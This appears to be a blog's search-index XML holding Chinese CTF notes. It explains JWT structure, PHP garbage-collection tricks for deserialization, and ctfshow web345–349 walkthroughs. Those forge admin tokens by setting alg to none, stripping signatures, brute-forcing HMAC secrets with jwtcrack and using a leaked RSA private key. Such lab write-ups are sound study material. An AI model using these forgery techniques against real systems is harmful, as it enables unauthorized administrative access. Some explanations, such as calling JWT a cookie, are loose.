<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>JWT</title>
    <url>/2025/03/16/JWT/</url>
    <content><![CDATA[<p>详细讲解</p>
<p><a href="https://blog.csdn.net/weixin_42753193/article/details/126294904?ops_request_misc=%257B%2522request%255Fid%2522%253A%25221c997edb3b2801ba264fd7599351e215%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=1c997edb3b2801ba264fd7599351e215&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-126294904-null-null.142%5Ev102%5Epc_search_result_base9&amp;utm_term=jwt%E4%BB%8B%E7%BB%8D&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/weixin_42753193/article/details/126294904?ops_request_misc=%257B%2522request%255Fid%2522%253A%25221c997edb3b2801ba264fd7599351e215%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=1c997edb3b2801ba264fd7599351e215&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-126294904-null-null.142^v102^pc_search_result_base9&amp;utm_term=jwt介绍&amp;spm=1018.2226.3001.4187</a></p>
<p>简单来说JWT就是一种cookie。<br>
其结构有三部分：header、payload和signature<br>
header: Token的类型(即 JWT)和所使用的签名算法(如 HMAC SHA256或 RSA)。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;,</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>payload: Token的第二部分是有效负载，其中包含声明。声明是关于实体(通常是用户)和其他数据的语句。有三种类型的声明: registered claims, public claims, and private claims。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;sub&quot;: &quot;1234567890&quot;,// 注册声明</span><br><span class="line">  &quot;name&quot;: &quot;John Doe&quot;,// 公共声明</span><br><span class="line">  &quot;admin&quot;: true // 私有声明</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>signature: 这些是一组预定义的声明，它们 <strong><code>不是强制性的，而是推荐的</code></strong> ，以 <strong><code>提供一组有用的、可互操作的声明</code></strong> 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iss: jwt签发者</span><br><span class="line">sub: jwt所面向的用户</span><br><span class="line">aud: 接收jwt的一方</span><br><span class="line">exp: jwt的过期时间，这个过期时间必须要大于签发时间</span><br><span class="line">nbf: 定义在什么时间之前，该jwt都是不可用的.</span><br><span class="line">iat: jwt的签发时间</span><br><span class="line">jti: jwt的唯一身份标识，主要用来作为一次性token,从而回避重放攻击</span><br></pre></td></tr></table></figure>
<h1>web345</h1>
<p>抓包看cookie，将sub后面的user改为admin并复制auth后面的内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auth=eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE3NDE3NjQxNTcsImV4cCI6MTc0MTc3MTM1NywibmJmIjoxNzQxNzY0MTU3LCJzdWIiOiJ1c2VyIiwianRpIjoiYTIzNDQyY2Y5MGM2Yzc0ZTQ2NWUzOTdlZjA0MmExYzAifV0</span><br></pre></td></tr></table></figure>
<p>变成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auth=eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE3NDE3NjQxNTcsImV4cCI6MTc0MTc3MTM1NywibmJmIjoxNzQxNzY0MTU3LCJzdWIiOiJhZG1pbiIsImp0aSI6ImEyMzQ0MmNmOTBjNmM3NGU0NjVlMzk3ZWYwNDJhMWMwIn1d</span><br></pre></td></tr></table></figure>
<p>用google打开页面，查看application当中的cookie，将auth后面的内容改为复制的内容，然后在url后面添加/admin/，然后回车</p>
<p>细心的人可以发现alg(Algorithm)后面的None，也就是说这里的cookie当中只有header和payload部分，没有signature部分。</p>
<h1>web346</h1>
<p>抓包后解码看到是HS256编码。</p>
<p>签名算法保证了JWT在传输的过程中不被恶意用户修改<br>
但是header中的alg字段可被修改为none<br>
一些JWT库支持none算法，即没有签名算法，当alg为none时后端不会进行签名校验<br>
将alg修改为none后，去掉JWT中的signature数据（仅剩header + ‘.’ + payload + ‘.’）然后提交到服务端即可</p>
<p>注意：这里不能像245那样修改，需要用脚本来跑</p>
]]></content>
      <tags>
        <tag>JWT</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP_GC垃圾回收机制</title>
    <url>/2025/04/14/PHP-GC%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<p>首先给出参考资料，各位可以直接看参考资料。我下面写的都基于参考加入我的理解而成的。</p>
<p><a href="https://xz.aliyun.com/news/11289">https://xz.aliyun.com/news/11289</a></p>
<h2 id="PHP中的GC垃圾回收机制-Garbage-collection">PHP中的GC垃圾回收机制(Garbage collection)</h2>
<p>在PHP中，使用<code>引用计数</code>和<code>回收周期</code>来自动管理内存对象的，<strong>当一个变量被设置为<code>NULL</code>，或者没有任何指针指向</strong><br>
<strong>时，它就会被变成垃圾，被<code>GC</code>机制自动回收掉</strong>，即当一个对象没有被引用时，就会被<code>GC</code>机制回收，在回收的过程中，它会自动触发<code>_destruct</code>方法，而这也就是我们绕过抛出异常的关键点。</p>
<p>引用计数和回收周期是为了优化内存，然而这种机制恰好造成了这里的&quot;漏洞&quot;。</p>
<p>我们通常使用的点是引用计数：<br>
引用计数的初始默认值为0，每次调用一个变量，引用计数<strong>加一</strong>，每次unset(删除)一个变量，引用计数<strong>减一</strong>。<br>
我们调用进程的时候，引用计数会增加(随着变量的增加而增加)；当进程结束时，引用计数会减到默认值0(随着变量的释放而减少)。使用<code>__destuct</code>魔法方法时进程会<strong>持续运行</strong>或<strong>抛出异常</strong>(<code>throw new Exception</code>)，抛出异常也可以认为是进程结束或者异常结束。那什么是持续运行呢？就是说我们的引用计数没有恢复默认值0，虽然代码执行完了，但是进程并没有结束。</p>
<p>当我们不得不使用<code>__destuct</code>魔法方法时可能会遇到抛出异常，例如throw new Exception(“高一新生报道”);将会抛出’高一新生报到’，进程结束，无论代码还有没有执行完毕。此时我们可以修改引用计数的数值，进而达到持续运行的目的。如若不持续运行而抛出了异常，过程中回显的一些flag等的一些字符串将会无法显示。</p>
<p>那怎样修改引用计数的值呢？我们知道引用计数的值随着变量的增加而增加，并且在反序列化的的格式码当中有对象的变量的个数，我们可以直接修改这里的值就相当于改变了引用计数的值，无论比原来的多还是少(<strong>因为只要默认值不为0即可</strong>)。</p>
<p>下图蓝线标注的为对象info的变量个数</p>
<p><img src="/2025/04/14/PHP-GC%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/D:%5CBlog%5Csource_posts%5CPHP-GC%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%5Cimage-20250322190944292.png" alt="image-20250322190944292"></p>
<p>小声bb：我们一般有多个对象，我们好像任意修改即可。具体的不知道，因为这是我自己测的，上一段最后少了一句：我们要改那个对象的变量的个数？</p>
<p>接下来进行测试</p>
<p>测试的话以ISCTF2024当中的“天命人”为例</p>
]]></content>
      <tags>
        <tag>PGP_GC垃圾回收机制</tag>
      </tags>
  </entry>
  <entry>
    <title>JWT</title>
    <url>/2025/04/14/JWT-1/</url>
    <content><![CDATA[<h1>JWT	JSON Web Token</h1>
<p><a href="https://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html">一篇好的文章</a></p>
<p>JWT是目前最流行的跨域认证解决方案。</p>
<p><strong>跨域认证</strong>解决方案是指在不同的网络域之间实现用户身份验证和授权的方法。在现代互联网应用中，一个系统可能由多个子系统组成，这些子系统可能部署在不同的服务器或域名下。当用户在一个子系统中登录后，需要在其他子系统中也能无缝地进行身份验证和访问资源，这就需要跨域认证解决方案</p>
<p><strong>无状态的应用场景</strong>是指在应用程序中，服务器不会保存用户请求之间的任何状态信息，每次请求都被视为独立的，服务器不会根据之前的请求来处理当前请求。这种设计模式在许多现代网络应用中非常常见，尤其是在分布式系统和微服务架构中。</p>
<h2 id="一、跨域认证的问题">一、跨域认证的问题</h2>
<p>互联网服务离不开用户认证。一般流程是下面这样。</p>
<blockquote>
<p>1、用户向服务器发送用户名和密码。</p>
<p>2、服务器验证通过后，在当前对话（session）里面保存相关数据，比如用户角色、登录时间等等。</p>
<p>3、服务器向用户返回一个 session_id，写入用户的 Cookie。</p>
<p>4、用户随后的每一次请求，都会通过 Cookie，将 session_id 传回服务器。</p>
<p>5、服务器收到 session_id，找到前期保存的数据，由此得知用户的身份。</p>
</blockquote>
<p>这种模式的问题在于，扩展性（scaling）不好。单机当然没有问题，如果是服务器集群，或者是跨域的服务导向架构，就要求 session 数据共享，每台服务器都能够读取 session。</p>
<p>举例来说，A 网站和 B 网站是同一家公司的关联服务。现在要求，用户只要在其中一个网站登录，再访问另一个网站就会自动登录，请问怎么实现？</p>
<p>一种解决方案是 session 数据持久化，写入数据库或别的持久层。各种服务收到请求后，都向持久层请求数据。这种方案的优点是架构清晰，缺点是工程量比较大。另外，持久层万一挂了，就会单点失败。</p>
<p>另一种方案是服务器索性不保存 session 数据了，所有数据都保存在客户端，每次请求都发回服务器。JWT 就是这种方案的一个代表。</p>
<h2 id="二、JWT-的原理">二、JWT 的原理</h2>
<p>JWT 的原理是，服务器认证以后，生成一个 JSON 对象，发回给用户，就像下面这样。</p>
<blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;姓名&quot;</span>: <span class="string">&quot;张三&quot;</span>,</span><br><span class="line"><span class="string">&quot;角色&quot;</span>: <span class="string">&quot;管理员&quot;</span>,</span><br><span class="line"><span class="string">&quot;到期时间&quot;</span>: <span class="string">&quot;2018年7月1日0点0分&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>以后，用户与服务端通信的时候，都要发回这个 JSON 对象。服务器完全只靠这个对象认定用户身份。为了防止用户篡改数据，服务器在生成这个对象的时候，会加上签名（详见后文）。</p>
<p>服务器就不保存任何 session 数据了，也就是说，服务器变成无状态了，从而比较容易实现扩展。</p>
<h2 id="三、JWT-的数据结构">三、JWT 的数据结构</h2>
<p>实际的 JWT 大概就像下面这样。</p>
<p><img src="https://cdn.beekka.com/blogimg/asset/201807/bg2018072304.jpg" alt="img"></p>
<p>它是一个很长的字符串，中间用点（<code>.</code>）分隔成三个部分。注意，JWT 内部是没有换行的，这里只是为了便于展示，将它写成了几行。</p>
<p>JWT 的三个部分依次如下。</p>
<blockquote>
<ul>
<li>Header（头部）</li>
<li>Payload（负载）</li>
<li>Signature（签名）</li>
</ul>
</blockquote>
<p>写成一行，就是下面的样子。</p>
<blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Header</span>.<span class="property">Payload</span>.<span class="property">Signature</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="https://cdn.beekka.com/blogimg/asset/201807/bg2018072303.jpg" alt="img"></p>
<p>下面依次介绍这三个部分。</p>
<h3 id="3-1-Header">3.1 Header</h3>
<p>Header 部分是一个 JSON 对象，描述 JWT 的元数据，通常是下面的样子。</p>
<blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;alg&quot;</span>: <span class="string">&quot;HS256&quot;</span>,</span><br><span class="line"><span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>上面代码中，<code>alg</code>属性表示签名的算法（algorithm），默认是 HMAC SHA256（写成 HS256）；<code>typ</code>属性表示这个令牌（token）的类型（type），JWT 令牌统一写为<code>JWT</code>。</p>
<p>最后，将上面的 JSON 对象使用 Base64URL 算法（详见后文）转成字符串。</p>
<h3 id="3-2-Payload">3.2 Payload</h3>
<p>Payload 部分也是一个 JSON 对象，用来存放实际需要传递的数据。JWT 规定了7个官方字段，供选用。</p>
<blockquote>
<ul>
<li>iss (issuer)：签发人</li>
<li>exp (expiration time)：过期时间</li>
<li>sub (subject)：主题</li>
<li>aud (audience)：受众</li>
<li>nbf (Not Before)：生效时间</li>
<li>iat (Issued At)：签发时间</li>
<li>jti (JWT ID)：编号</li>
</ul>
</blockquote>
<p>除了官方字段，你还可以在这个部分定义私有字段，下面就是一个例子。</p>
<blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;sub&quot;</span>: <span class="string">&quot;1234567890&quot;</span>,</span><br><span class="line"><span class="string">&quot;name&quot;</span>: <span class="string">&quot;John Doe&quot;</span>,</span><br><span class="line"><span class="string">&quot;admin&quot;</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>注意，JWT 默认是不加密的，任何人都可以读到，所以不要把秘密信息放在这个部分。</p>
<p>这个 JSON 对象也要使用 Base64URL 算法转成字符串。</p>
<h3 id="3-3-Signature">3.3 Signature</h3>
<p>Signature 部分是对前两部分的签名，防止数据篡改。</p>
<p>首先，需要指定一个密钥（secret）。这个密钥只有服务器才知道，不能泄露给用户。然后，使用 Header 里面指定的签名算法（默认是 HMAC SHA256），按照下面的公式产生签名。</p>
<blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">HMACSHA256</span>(</span><br><span class="line"><span class="title function_">base64UrlEncode</span>(header) + <span class="string">&quot;.&quot;</span> +</span><br><span class="line"><span class="title function_">base64UrlEncode</span>(payload),</span><br><span class="line">secret)</span><br></pre></td></tr></table></figure>
</blockquote>
<p>算出签名以后，把 Header、Payload、Signature 三个部分拼成一个字符串，每个部分之间用&quot;点&quot;（<code>.</code>）分隔，就可以返回给用户。</p>
<h3 id="3-4-Base64URL">3.4 Base64URL</h3>
<p>前面提到，Header 和 Payload 串型化的算法是 Base64URL。这个算法跟 Base64 算法基本类似，但有一些小的不同。</p>
<p>JWT 作为一个令牌（token），有些场合可能会放到 URL（比如 <a href="http://api.example.com/?token=xxx%EF%BC%89%E3%80%82Base64">api.example.com/?token=xxx）。Base64</a> 有三个字符<code>+</code>、<code>/</code>和<code>=</code>，在 URL 里面有特殊含义，所以要被替换掉：<code>=</code>被省略、<code>+</code>替换成<code>-</code>，<code>/</code>替换成<code>_</code> 。这就是 Base64URL 算法。</p>
<h2 id="四、JWT-的使用方式">四、JWT 的使用方式</h2>
<p>客户端收到服务器返回的 JWT，可以储存在 Cookie 里面，也可以储存在 localStorage。</p>
<p>此后，客户端每次与服务器通信，都要带上这个 JWT。你可以把它放在 Cookie 里面自动发送，但是这样不能跨域，所以更好的做法是放在 HTTP 请求的头信息<code>Authorization</code>字段里面。</p>
<blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Authorization</span>: <span class="title class_">Bearer</span> &lt;token&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>另一种做法是，跨域的时候，JWT 就放在 POST 请求的数据体里面。</p>
<h2 id="五、JWT-的几个特点">五、JWT 的几个特点</h2>
<p>（1）JWT 默认是不加密，但也是可以加密的。生成原始 Token 以后，可以用密钥再加密一次。</p>
<p>（2）JWT 不加密的情况下，不能将秘密数据写入 JWT。</p>
<p>（3）JWT 不仅可以用于认证，也可以用于交换信息。有效使用 JWT，可以降低服务器查询数据库的次数。</p>
<p>（4）JWT 的最大缺点是，由于服务器不保存 session 状态，因此无法在使用过程中废止某个 token，或者更改 token 的权限。也就是说，一旦 JWT 签发了，在到期之前就会始终有效，除非服务器部署额外的逻辑。</p>
<p>（5）JWT 本身包含了认证信息，一旦泄露，任何人都可以获得该令牌的所有权限。为了减少盗用，JWT 的有效期应该设置得比较短。对于一些比较重要的权限，使用时应该再次对用户进行认证。</p>
<p>（6）为了减少盗用，JWT 不应该使用 HTTP 协议明码传输，要使用 HTTPS 协议传输。</p>
<h1>Web345</h1>
<p>信息收集到一个文件/admin/<br>
我们在url后面接上/admin/之后用hacbar进行load一下发现了cookie当中出现了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auth=eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE3NDM4Mjk0NDAsImV4cCI6MTc0MzgzNjY0MCwibmJmIjoxNzQzODI5NDQwLCJzdWIiOiJ1c2VyIiwianRpIjoiNjU5MjdjNTg0ZTZjMjJlNzJhZDU0MGI5Nzk2NWI3MTkifV0</span><br></pre></td></tr></table></figure>
<p>我们进行解码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE3NDM4Mjk0NDAsImV4cCI6MTc0MzgzNjY0MCwibmJmIjoxNzQzODI5NDQwLCJzdWIiOiJ1c2VyIiwianRpIjoiNjU5MjdjNTg0ZTZjMjJlNzJhZDU0MGI5Nzk2NWI3MTkifV0.</span><br><span class="line">	|解码</span><br><span class="line">	↓</span><br><span class="line">&#123;</span><br><span class="line">  &quot;header&quot;: &#123;</span><br><span class="line">    &quot;alg&quot;: &quot;None&quot;,</span><br><span class="line">    &quot;typ&quot;: &quot;jwt&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;payload&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;iss&quot;: &quot;admin&quot;,</span><br><span class="line">      &quot;iat&quot;: 1743829440,</span><br><span class="line">      &quot;exp&quot;: 1743836640,</span><br><span class="line">      &quot;nbf&quot;: 1743829440,</span><br><span class="line">      &quot;sub&quot;: &quot;user&quot;,</span><br><span class="line">      &quot;jti&quot;: &quot;65927c584e6c22e72ad540b97965b719&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  &quot;signature&quot;: &quot;&quot;,</span><br><span class="line">  &quot;verified&quot;: false,</span><br><span class="line">  &quot;secret&quot;: &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们将sub的值给改成admin，然后再将jwt加密后的东西填进cookie之后进入/admin/文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auth=eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE3NDM4Mjk0NDAsImV4cCI6MTc0MzgzNjY0MCwibmJmIjoxNzQzODI5NDQwLCJzdWIiOiJhZG1pbiIsImp0aSI6IjY1OTI3YzU4NGU2YzIyZTcyYWQ1NDBiOTc5NjViNzE5In1d.</span><br></pre></td></tr></table></figure>
<h1>web346</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTc0MzgyOTkwNiwiZXhwIjoxNzQzODM3MTA2LCJuYmYiOjE3NDM4Mjk5MDYsInN1YiI6InVzZXIiLCJqdGkiOiIxYmNmNTM5YTMyOWVkZmIxMzNmMmY2MmM4Yzg5MjU0ZCJ9.7md-ePkT60Fv6OV_9ExXY3x2IQ7V3Nu6gf5FnBiujcs</span><br></pre></td></tr></table></figure>
<p>肉口令拿到SIGNATURE的密码为123456，随后可以构造payload字段。或者直接把SIGNATURE字段删除，HEAD当中的加密算法改成none</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTc0MzgyOTkwNiwiZXhwIjoxNzQzODM3MTA2LCJuYmYiOjE3NDM4Mjk5MDYsInN1YiI6ImFkbWluIiwianRpIjoiMWJjZjUzOWEzMjllZGZiMTMzZjJmNjJjOGM4OTI1NGQifQ.9aP-fGC8d3L2nay3ZLJZkfQyOChVy-CO4kd-D6X-AjM</span><br><span class="line"></span><br><span class="line">eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTc0MzgyOTkwNiwiZXhwIjoxNzQzODM3MTA2LCJuYmYiOjE3NDM4Mjk5MDYsInN1YiI6ImFkbWluIiwianRpIjoiMWJjZjUzOWEzMjllZGZiMTMzZjJmNjJjOGM4OTI1NGQifQ.</span><br></pre></td></tr></table></figure>
<p>记得/admin/</p>
<h1>web347</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTc0MzgzMDE2NSwiZXhwIjoxNzQzODM3MzY1LCJuYmYiOjE3NDM4MzAxNjUsInN1YiI6InVzZXIiLCJqdGkiOiJkY2EzYzYwZjM1NzdkOTYyZjFmNWE5ODgzMzI4NDhkNCJ9.btMKq-KPkgvIMAYqokycG720DCBWG5Fuz0ab_K7Nn6o</span><br></pre></td></tr></table></figure>
<p>这里需要爆破密码，使用kali当中的jtwcrack</p>
<p>进入jwtcrack文件，运行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTc0MzgzMDE2NSwiZXhwIjoxNzQzODM3MzY1LCJuYmYiOjE3NDM4MzAxNjUsInN1YiI6InVzZXIiLCJqdGkiOiJkY2EzYzYwZjM1NzdkOTYyZjFmNWE5ODgzMzI4NDhkNCJ9.btMKq-KPkgvIMAYqokycG720DCBWG5Fuz0ab_K7Nn6o</span><br></pre></td></tr></table></figure>
<h1>web348</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTc0MzgzMTI0OSwiZXhwIjoxNzQzODM4NDQ5LCJuYmYiOjE3NDM4MzEyNDksInN1YiI6InVzZXIiLCJqdGkiOiI4NTBhY2NiMmMxMThkN2ExMWFjNDdmOThjMzQwZTE1NSJ9.IOCIIiRZb4VibpE-tzh9WY5o4NcaURLEOteLK63JK10</span><br></pre></td></tr></table></figure>
<p>jwtcrack爆破密码为aaab。改payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTc0MzgzMTI0OSwiZXhwIjoxNzQzODM4NDQ5LCJuYmYiOjE3NDM4MzEyNDksInN1YiI6ImFkbWluIiwianRpIjoiODUwYWNjYjJjMTE4ZDdhMTFhYzQ3Zjk4YzM0MGUxNTUifQ.FcMST4qmUDEe_IUnRCe5S8DsQxoPHHkhA9Vs1r4Njrk</span><br></pre></td></tr></table></figure>
<h1>web349</h1>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  <span class="comment">// 设置响应类型为 HTML</span></span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="comment">// 读取私钥文件，用于生成 JWT 签名</span></span><br><span class="line">  <span class="keyword">var</span> privateKey = fs.<span class="title function_">readFileSync</span>(process.<span class="title function_">cwd</span>() + <span class="string">&#x27;//public//private.key&#x27;</span>);</span><br><span class="line">  <span class="comment">// 使用私钥生成 JWT，设置用户为 &#x27;user&#x27;，并使用 RS256 算法</span></span><br><span class="line">  <span class="keyword">var</span> token = jwt.<span class="title function_">sign</span>(&#123; <span class="attr">user</span>: <span class="string">&#x27;user&#x27;</span> &#125;, privateKey, &#123; <span class="attr">algorithm</span>: <span class="string">&#x27;RS256&#x27;</span> &#125;);</span><br><span class="line">  <span class="comment">// 将生成的 JWT 作为 Cookie 设置到响应中</span></span><br><span class="line">  res.<span class="title function_">cookie</span>(<span class="string">&#x27;auth&#x27;</span>, token);</span><br><span class="line">  <span class="comment">// 返回简单的 HTML 响应</span></span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&#x27;where is flag?&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* POST home page. */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  <span class="comment">// 设置响应类型为 HTML</span></span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="comment">// 定义一个示例 flag（在实际部署中应替换为真实的敏感信息）</span></span><br><span class="line">  <span class="keyword">var</span> flag = <span class="string">&quot;flag_here&quot;</span>;</span><br><span class="line">  <span class="comment">// 从请求的 Cookie 中获取名为 &#x27;auth&#x27; 的 JWT</span></span><br><span class="line">  <span class="keyword">var</span> auth = req.<span class="property">cookies</span>.<span class="property">auth</span>;</span><br><span class="line">  <span class="comment">// 读取公钥文件，用于验证 JWT 签名</span></span><br><span class="line">  <span class="keyword">var</span> cert = fs.<span class="title function_">readFileSync</span>(process.<span class="title function_">cwd</span>() + <span class="string">&#x27;//public/public.key&#x27;</span>);  <span class="comment">// 获取公钥</span></span><br><span class="line">  <span class="comment">// 使用公钥验证 JWT 的签名</span></span><br><span class="line">  jwt.<span class="title function_">verify</span>(auth, cert, <span class="keyword">function</span>(<span class="params">err, decoded</span>) &#123;</span><br><span class="line">    <span class="comment">// 如果 JWT 验证成功</span></span><br><span class="line">    <span class="keyword">if</span> (decoded.<span class="property">user</span> === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">      <span class="comment">// 如果用户是 &#x27;admin&#x27;，返回 flag</span></span><br><span class="line">      res.<span class="title function_">end</span>(flag);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// 如果用户不是 &#x27;admin&#x27;，返回提示信息</span></span><br><span class="line">      res.<span class="title function_">end</span>(<span class="string">&#x27;you are not admin&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>这段js代码关键部分在public.key和private.key，我们可以下载下来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDNioS2aSHtu6WIU88oWzpShhkb</span><br><span class="line">+r6QPBryJmdaR1a3ToD9sXDbeni5WTsWVKrmzmCk7tu4iNtkmn/r9D/bFcadHGnX</span><br><span class="line">YqlTJItOdHZio3Bi1J2Elxg8IEBKx9g6RggTOGXQFxSxlzLNMRzRC4d2PcA9mxjA</span><br><span class="line">bG1Naz58ibbtogeglQIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIICWwIBAAKBgQDNioS2aSHtu6WIU88oWzpShhkb+r6QPBryJmdaR1a3ToD9sXDb</span><br><span class="line">eni5WTsWVKrmzmCk7tu4iNtkmn/r9D/bFcadHGnXYqlTJItOdHZio3Bi1J2Elxg8</span><br><span class="line">IEBKx9g6RggTOGXQFxSxlzLNMRzRC4d2PcA9mxjAbG1Naz58ibbtogeglQIDAQAB</span><br><span class="line">AoGAE+mAc995fvt3zN45qnI0EzyUgCZpgbWg8qaPyqowl2+OhYVEJq8VtPcVB1PK</span><br><span class="line">frOtnyzYsmbnwjZJgEVYTlQsum0zJBuTKoN4iDoV0Oq1Auwlcr6O0T35RGiijqAX</span><br><span class="line">h7iFjNscfs/Dp/BnyKZuu60boXrcuyuZ8qXHz0exGkegjMECQQD1eP39cPhcwydM</span><br><span class="line">cdEBOgkI/E/EDWmdjcwIoauczwiQEx56EjAwM88rgxUGCUF4R/hIW9JD1vlp62Qi</span><br><span class="line">ST9LU4lxAkEA1lsfr9gF/9OdzAsPfuTLsl+l9zpo1jjzhXlwmHFgyCAn7gBKeWdv</span><br><span class="line">ubocOClTTQ7Y4RqivomTmlNVtmcHda1XZQJAR0v0IZedW3wHPwnT1dJga261UFFA</span><br><span class="line">+tUDjQJAERSE/SvAb143BtkVdCLniVBI5sGomIOq569Z0+zdsaOqsZs60QJAYqtJ</span><br><span class="line">V7EReeQX8693r4pztSTQCZBKZ6mJdvwidxlhWl1q4+QgY+fYBt8DVFq5bHQUIvIW</span><br><span class="line">zawYVGZdwvuD9IgY/QJAGCJbXA+Knw10B+g5tDZfVHsr6YYMY3Q24zVu4JXozWDV</span><br><span class="line">x+G39IajrVKwuCPG2VezWfwfWpTeo2bDmQS0CWOPjA==</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
<p>这里要安装node。省略安装步骤</p>
<p>运行如下代码得先安装两个库：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install jwt</span><br><span class="line">pip install pyjwt</span><br></pre></td></tr></table></figure>
<p><a href="http://aaa.py">aaa.py</a></p>
